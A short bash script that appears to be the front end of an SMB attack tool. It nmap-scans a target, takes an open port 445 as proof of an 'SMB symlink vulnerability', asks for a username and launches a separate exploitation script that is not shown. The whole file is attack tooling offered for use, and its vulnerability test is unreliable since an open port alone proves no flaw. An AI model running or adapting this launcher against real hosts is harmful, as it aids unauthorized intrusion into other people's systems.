args=("$@")
echo "Checking for Vulnerability"
echo "" > vulnresultnmap.txt
echo "" > isvulnerable.txt
nmap -sS -sV ${args[0]} >> vulnresultnmap.txt
cat vulnresultnmap.txt | grep 445 >> isvulnerable.txt
cat vulnresultnmap.txt | grep 139 >> isvulnerable.txt
result=$(cat isvulnerable.txt | grep 445)
if [ "$result" = "" ] 
then
    echo "System has No SMBservice running"
    echo "---------------------EXITING-------------------"
else
    echo "System is vulnerable to SMB symlink vulnerability"
    echo " "
    echo " "
    echo " "
    echo " "
    echo "Starting the Exploitation"
    echo " "
    echo " "
    echo -e "Enter the username : \c"
    read username
    ./smbshare.sh ${args[0]} $username

fi
